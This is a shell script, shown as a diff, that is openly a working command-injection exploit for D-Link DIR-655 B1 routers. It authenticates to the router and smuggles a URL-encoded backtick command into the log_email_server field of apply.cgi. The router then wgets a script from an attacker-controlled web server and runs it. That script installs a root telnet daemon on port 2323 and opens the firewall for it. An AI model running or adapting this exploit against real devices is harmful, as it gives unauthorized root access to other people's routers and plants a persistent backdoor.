@@ -1,0 +1,59 @@
+#!/bin/sh
+# D-LINK DIR-655B1 2.10NA -> 2.12NA command injection && telnetd installer
+# 9/23/17 - morb_commat_misentropic_dot_commercial
+#
+# Requires: a httpd, curl, ncat, openssl
+#
+# edit the following and make sure to copy the telnetd binary to $WWWROOT
+# $HTPASSWD must be base64 encoded (if set)
+ROUTER=192.168.1.1        
+WWW=192.168.1.20 
+WWWROOT=/var/www/htdocs   
+HTPASSWD=                 
+#
+CURL_OPTS="-o /dev/null -s --connect-timeout 3"
+PORT=2323 
+cat > ${WWWROOT}/t.sh << __EOF__
+#!/bin/hush
+rm /etc/t.sh
+grep -q ${PORT} /etc/inetd.conf || echo ${PORT} stream tcp nowait root /etc/telnetd >> /etc/inetd.conf
+[ -x /etc/telnetd ] || wget -O /etc/telnetd http://${WWW}/telnetd;chmod +x /etc/telnetd
+killall -HUP inetd; sleep 15;iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
+__EOF__
+LOOP="%60%5B%20%21%20-f%20%2Fetc%2Ft.sh%20%5D%20%26%26%20%28%20cd%20%2Fetc%3B%20wget%20http%3A%2F%2F${WWW}%2F${ROUTER}%2Ft.sh%20%29%3Bhush%20%2Fetc%2Ft.sh%60"
+
+dologin() {
+  curl ${CURL_OPTS} http://${ROUTER}/login.cgi --data "login_name=YWRtaW4A&login_pass=${HTPASSWD}"
+}
+
+dorest() {
+  until ! curl ${CURL_OPTS} http://${ROUTER}/index.asp
+  do sleep 1; done
+  until curl ${CURL_OPTS} http://${ROUTER}/index.asp
+  do sleep 1; done
+}
+
+doreboot() {
+  curl ${CURL_OPTS} http://${ROUTER}/reboot.cgi
+  dorest
+}
+
+dosched() {
+  dologin
+  curl ${CURL_OPTS} http://${ROUTER}/apply.cgi --data 'reboot_type=all&edit=-1&del_row=-1&max_row='\
+'-1&log_email_schedule=0%2F25%2F0%2FNever%2FNever&schedule_rule_00=ayy%2F1111111%2F00%3A00'\
+'%2F24%3A00&schedule_time_format=24&name=a&all_week=1&time_type=1&button=Save'
+}
+
+loop() {
+  dologin
+  curl ${CURL_OPTS} http://${ROUTER}/apply.cgi --data "reboot_type=application&log_email_schedule="\
+"0%2F25%2F0%2Fayy%2F+Sun+Mon+Tue+Wed+Thu+Fri+Sat+00%3A00-24%3A00&log_email_enable=1&button3="\
+"Save+Settings&email_enable=1&log_email_sender=a%40a&log_email_recipien=b%40b&"\
+"log_email_server=${@}&log_email_server_port=25&log_email_auth=0&by_email_sch=25&email_schedule=a"
+  doreboot
+}
+
+dosched
+loop $LOOP
+until ncat -vzw5 ${ROUTER/:*/} ${PORT}; do COUNT=$(( $COUNT + 1 )); sleep 5; [ $COUNT -gt 5 ] && break ; done
